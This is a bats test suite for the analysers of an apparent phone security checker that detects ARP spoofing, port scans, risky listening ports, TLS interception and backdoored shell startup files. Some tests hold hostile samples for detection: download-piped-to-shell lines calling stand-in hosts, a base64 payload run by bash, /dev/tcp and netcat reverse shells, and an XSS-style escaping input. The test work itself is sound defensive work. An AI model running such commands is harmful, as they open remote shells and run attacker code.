#!/usr/bin/env bats
# Tests for the pure analysers: everything that turns captured system output
# into a verdict. These are the functions that decide whether a user is told
# their phone is under attack, so they are tested against both real attack
# output and ordinary output that must not be flagged.

setup() {
    load "$BATS_TEST_DIRNAME/helper.bash"
    load_analysers
}

# ---------------------------------------------------------------------------
# Address decoding
# ---------------------------------------------------------------------------

@test "hex_to_ipv4 decodes little-endian /proc addresses" {
    [ "$(hex_to_ipv4 '0100007F')" = '127.0.0.1' ]
    [ "$(hex_to_ipv4 '0101A8C0')" = '192.168.1.1' ]
    [ "$(hex_to_ipv4 '00000000')" = '0.0.0.0' ]
}

@test "hex_to_ipv4 returns nothing for input that is not 8 hex digits" {
    [ -z "$(hex_to_ipv4 'FFFF')" ]
    [ -z "$(hex_to_ipv4 '')" ]
}

@test "parse_default_gateway finds the default route" {
    local route
    route='Iface	Destination	Gateway 	Flags	RefCnt	Use	Metric	Mask		MTU	Window	IRTT
wlan0	00C0A8C0	00000000	0001	0	0	0	00FFFFFF	0	0	0
wlan0	00000000	0101A8C0	0003	0	0	0	00000000	0	0	0'
    [ "$(printf '%s\n' "$route" | parse_default_gateway)" = '192.168.1.1' ]
}

@test "parse_default_gateway prints nothing when there is no default route" {
    local route
    route='Iface	Destination	Gateway 	Flags
wlan0	00C0A8C0	00000000	0001'
    [ -z "$(printf '%s\n' "$route" | parse_default_gateway)" ]
}

# ---------------------------------------------------------------------------
# ARP spoofing
# ---------------------------------------------------------------------------

@test "parse_proc_net_arp keeps complete entries and drops incomplete ones" {
    local arp out
    arp='IP address       HW type     Flags       HW address            Mask     Device
192.168.1.1      0x1         0x2         aa:bb:cc:11:22:33     *        wlan0
192.168.1.9      0x1         0x0         00:00:00:00:00:00     *        wlan0
192.168.1.50     0x1         0x2         de:ad:be:ef:00:01     *        wlan0'
    out="$(printf '%s\n' "$arp" | parse_proc_net_arp)"
    [ "$(printf '%s\n' "$out" | wc -l)" -eq 2 ]
    printf '%s' "$out" | grep -q '192.168.1.1	aa:bb:cc:11:22:33	wlan0'
    ! printf '%s' "$out" | grep -q '00:00:00:00:00:00'
}

@test "find_arp_anomaly detects one MAC claiming the gateway and another host" {
    local parsed out
    parsed='192.168.1.1	de:ad:be:ef:00:01	wlan0
192.168.1.77	de:ad:be:ef:00:01	wlan0
192.168.1.20	aa:bb:cc:11:22:33	wlan0'
    out="$(printf '%s\n' "$parsed" | find_arp_anomaly)"
    printf '%s' "$out" | grep -q 'de:ad:be:ef:00:01'
    printf '%s' "$out" | grep -q '192.168.1.1'
}

@test "find_arp_anomaly stays silent on a normal ARP table" {
    local parsed
    parsed='192.168.1.1	aa:bb:cc:11:22:33	wlan0
192.168.1.20	11:22:33:44:55:66	wlan0
192.168.1.33	99:88:77:66:55:44	wlan0'
    [ -z "$(printf '%s\n' "$parsed" | find_arp_anomaly)" ]
}

# ---------------------------------------------------------------------------
# Listening sockets
# ---------------------------------------------------------------------------

@test "parse_proc_net_tcp returns only sockets in the LISTEN state" {
    local tcp out
    tcp='  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:15B3 00000000:0000 0A 00000000:00000000 00:00000000  00000000     0        0 1234 1
   1: 0100007F:1F5E 00000000:0000 0A 00000000:00000000 00:00000000 00000000  10123        0 1235 1
   2: 0101A8C0:D431 3E0AA8C0:0050 01 00000000:00000000 00:00000000  00000000  10123        0 1236 1'
    out="$(printf '%s\n' "$tcp" | parse_proc_net_tcp)"
    [ "$(printf '%s\n' "$out" | wc -l)" -eq 2 ]
    printf '%s' "$out" | grep -q '^0\.0\.0\.0	5555$'
    printf '%s' "$out" | grep -q '^127\.0\.0\.1	8030$'
}

@test "parse_proc_net_tcp labels IPv6 sockets rather than mis-decoding them" {
    local tcp out
    tcp='  sl  local_address                         remote_address                        st
   0: 00000000000000000000000000000000:1F90 00000000000000000000000000000000:0000 0A'
    out="$(printf '%s\n' "$tcp" | parse_proc_net_tcp)"
    [ "$out" = "[v6]	8080" ]
}

@test "classify_listening_port rates ADB and handler ports as critical" {
    printf '%s' "$(classify_listening_port 5555)" | grep -q '^critical'
    printf '%s' "$(classify_listening_port 4444)" | grep -q '^critical'
    printf '%s' "$(classify_listening_port 23)" | grep -q '^critical'
}

@test "classify_listening_port says nothing about ordinary ports" {
    [ -z "$(classify_listening_port 443)" ]
    [ -z "$(classify_listening_port 53)" ]
    [ -z "$(classify_listening_port 37215)" ]
}

# ---------------------------------------------------------------------------
# Port scan reconstruction
# ---------------------------------------------------------------------------

@test "parse_firewall_drop_line extracts source and destination port" {
    local line out
    line='<4>[ 9823.441] KCM-DROP IN=wlan0 OUT= MAC=aa:bb SRC=192.168.1.50 DST=192.168.1.77 LEN=60 PROTO=TCP SPT=51234 DPT=22 WINDOW=1024'
    out="$(parse_firewall_drop_line "$line")"
    [ "$out" = "192.168.1.50	22" ]
}

@test "parse_firewall_drop_line ignores unrelated kernel messages" {
    [ -z "$(parse_firewall_drop_line '<6>[ 12.00] wlan0: authenticated')" ]
    [ -z "$(parse_firewall_drop_line '')" ]
}

@test "find_port_scan_source flags a host touching many distinct ports" {
    local hits out
    hits="$(for p in 21 22 23 25 80 110 139 443 445 3389; do printf '192.168.1.50\t%s\n' "$p"; done)"
    out="$(printf '%s\n' "$hits" | find_port_scan_source 8)"
    printf '%s' "$out" | grep -q '^192\.168\.1\.50	10$'
}

@test "find_port_scan_source ignores a host repeatedly hitting one port" {
    local hits
    hits="$(for _ in 1 2 3 4 5 6 7 8 9 10 11 12; do printf '192.168.1.50\t443\n'; done)"
    [ -z "$(printf '%s\n' "$hits" | find_port_scan_source 8)" ]
}

@test "find_port_scan_source respects the threshold" {
    local hits
    hits="$(for p in 21 22 23; do printf '10.0.0.5\t%s\n' "$p"; done)"
    [ -z "$(printf '%s\n' "$hits" | find_port_scan_source 8)" ]
    [ -n "$(printf '%s\n' "$hits" | find_port_scan_source 3)" ]
}

# ---------------------------------------------------------------------------
# Shell startup persistence
# ---------------------------------------------------------------------------

@test "rc_line_is_suspicious catches download-piped-to-shell" {
    rc_line_is_suspicious 'curl -s http://10.0.0.5/x.sh | sh'
    rc_line_is_suspicious 'wget -qO- http://evil.tld/p | bash'
    rc_line_is_suspicious 'curl -fsSL http://1.2.3.4/a |  sudo bash'
}

@test "rc_line_is_suspicious catches encoded payloads and reverse shells" {
    rc_line_is_suspicious 'echo ZXZpbAo= | base64 -d | bash'
    rc_line_is_suspicious 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
    rc_line_is_suspicious 'nc -e /bin/sh 10.0.0.5 4444'
    rc_line_is_suspicious 'python -c "import socket,os,pty;s=socket.socket()"'
}

@test "rc_line_is_suspicious leaves ordinary startup lines alone" {
    # A false positive here tells someone their phone is backdoored when it is
    # not, so this list is deliberately full of things that look alarming.
    ! rc_line_is_suspicious 'export PATH="$HOME/bin:$PATH"'
    ! rc_line_is_suspicious 'eval "$(starship init bash)"'
    ! rc_line_is_suspicious 'alias ll="ls -alF"'
    ! rc_line_is_suspicious '# curl http://example.com | sh'
    ! rc_line_is_suspicious 'command -v nc >/dev/null && alias netcat=nc'
    ! rc_line_is_suspicious 'curl -s https://wttr.in > /tmp/weather'
    ! rc_line_is_suspicious 'python3 -c "print(1)"'
    ! rc_line_is_suspicious 'base64 /etc/hostname > /tmp/h'
    ! rc_line_is_suspicious 'source "$HOME/.cargo/env"'
    ! rc_line_is_suspicious ''
}

# ---------------------------------------------------------------------------
# PATH hygiene
# ---------------------------------------------------------------------------

@test "path_entry_is_unsafe flags relative and empty entries only" {
    path_entry_is_unsafe ''
    path_entry_is_unsafe '.'
    path_entry_is_unsafe 'bin'
    path_entry_is_unsafe '../tools'
    ! path_entry_is_unsafe '/usr/bin'
    ! path_entry_is_unsafe '/data/data/com.termux/files/usr/bin'
}

@test "find_unsafe_path_entries reports a trailing colon as an empty entry" {
    local out
    out="$(find_unsafe_path_entries '/usr/bin:/bin:')"
    [ "$out" = '<empty>' ]
    [ -z "$(find_unsafe_path_entries '/usr/bin:/bin')" ]
}

# ---------------------------------------------------------------------------
# Config file editing
# ---------------------------------------------------------------------------

@test "set_config_directive replaces an existing directive" {
    local out
    out="$(set_config_directive 'Port 8022
PasswordAuthentication yes
PrintMotd no' 'PasswordAuthentication' 'no')"
    [ "$(printf '%s\n' "$out" | grep -c '^PasswordAuthentication')" -eq 1 ]
    printf '%s' "$out" | grep -q '^PasswordAuthentication no$'
    printf '%s' "$out" | grep -q '^Port 8022$'
}

@test "set_config_directive replaces a commented directive instead of leaving both" {
    local out
    out="$(set_config_directive '#PasswordAuthentication yes
Port 8022' 'PasswordAuthentication' 'no')"
    [ "$(printf '%s\n' "$out" | grep -ci 'PasswordAuthentication')" -eq 1 ]
}

@test "set_config_directive is idempotent" {
    local once twice
    once="$(set_config_directive 'Port 8022' 'PasswordAuthentication' 'no')"
    twice="$(set_config_directive "$once" 'PasswordAuthentication' 'no')"
    [ "$once" = "$twice" ]
}

@test "config_directive_value reads the effective value" {
    local content
    content='PasswordAuthentication yes
#PasswordAuthentication no
PasswordAuthentication no'
    [ "$(config_directive_value "$content" 'PasswordAuthentication')" = 'no' ]
    [ -z "$(config_directive_value "$content" 'PermitRootLogin')" ]
}

# ---------------------------------------------------------------------------
# Package inventory
# ---------------------------------------------------------------------------

@test "parse_pm_package_line splits package from installer" {
    [ "$(parse_pm_package_line 'package:com.foo.bar  installer=com.android.vending')" = "com.foo.bar	com.android.vending" ]
    [ "$(parse_pm_package_line 'package:com.foo.bar  installer=null')" = "com.foo.bar	" ]
    [ -z "$(parse_pm_package_line 'not a package line')" ]
}

@test "installer_is_sideload recognises the known stores" {
    ! installer_is_sideload 'com.android.vending'
    ! installer_is_sideload 'org.fdroid.fdroid'
    ! installer_is_sideload 'com.sec.android.app.samsungapps'
    installer_is_sideload ''
    installer_is_sideload 'com.android.packageinstaller'
    installer_is_sideload 'com.android.shell'
}

@test "split_colon_list and component_package handle Android component lists" {
    local out
    out="$(split_colon_list 'com.a/.SvcA:com.b/.SvcB')"
    [ "$(printf '%s\n' "$out" | wc -l)" -eq 2 ]
    [ "$(component_package 'com.example.rat/.MainService')" = 'com.example.rat' ]
    [ -z "$(split_colon_list '')" ]
}

# ---------------------------------------------------------------------------
# TLS interception
# ---------------------------------------------------------------------------

@test "classify_tls_issuer identifies proxy certificate authorities" {
    [ "$(classify_tls_issuer 'issuer=C = PortSwigger, O = PortSwigger, CN = PortSwigger CA')" = 'interception' ]
    [ "$(classify_tls_issuer 'CN = mitmproxy, O = mitmproxy')" = 'interception' ]
    [ "$(classify_tls_issuer 'O = XK72 Ltd, CN = Charles Proxy CA')" = 'interception' ]
    [ "$(classify_tls_issuer 'CN = OWASP ZAP Root CA')" = 'interception' ]
}

@test "classify_tls_issuer accepts the public certificate authorities" {
    [ "$(classify_tls_issuer 'C = US, O = Google Trust Services LLC, CN = GTS CA 1C3')" = 'trusted' ]
    [ "$(classify_tls_issuer "C = US, O = Let's Encrypt, CN = R3")" = 'trusted' ]
    [ "$(classify_tls_issuer 'C = US, O = DigiCert Inc, CN = DigiCert TLS RSA SHA256 2020 CA1')" = 'trusted' ]
    [ "$(classify_tls_issuer 'C = GB, O = Sectigo Limited, CN = Sectigo RSA DV')" = 'trusted' ]
}

@test "classify_tls_issuer treats an unknown or missing issuer as unrecognised" {
    [ "$(classify_tls_issuer 'CN = corp-internal-ca')" = 'unrecognised' ]
    [ "$(classify_tls_issuer '')" = 'unrecognised' ]
}

# ---------------------------------------------------------------------------
# Address classification
# ---------------------------------------------------------------------------

@test "is_private_address covers RFC1918, link-local and unique-local" {
    is_private_address '192.168.1.1'
    is_private_address '10.4.4.4'
    is_private_address '172.16.0.1'
    is_private_address '172.31.255.254'
    is_private_address '169.254.1.1'
    is_private_address 'fd00:1234::1'
    ! is_private_address '8.8.8.8'
    ! is_private_address '172.32.0.1'
    ! is_private_address '1.1.1.1'
    ! is_private_address ''
}

# ---------------------------------------------------------------------------
# Report escaping
# ---------------------------------------------------------------------------

@test "html_escape neutralises markup in device-supplied strings" {
    local out
    out="$(html_escape '<img src=x onerror="alert(1)"> & done')"
    [ "$out" = '&lt;img src=x onerror=&quot;alert(1)&quot;&gt; &amp; done' ]
}

@test "json_escape produces a parseable string" {
    local out
    out="$(json_escape 'he said "hi" \ then left')"
    printf '{"v": "%s"}' "$out" | jq -e '.v' >/dev/null
}

@test "json_escape folds newlines so the document stays on one line" {
    local out
    out="$(json_escape 'line one
line two')"
    [ "$out" = 'line one\nline two' ]
    printf '{"v": "%s"}' "$out" | jq -e '.v' >/dev/null
}
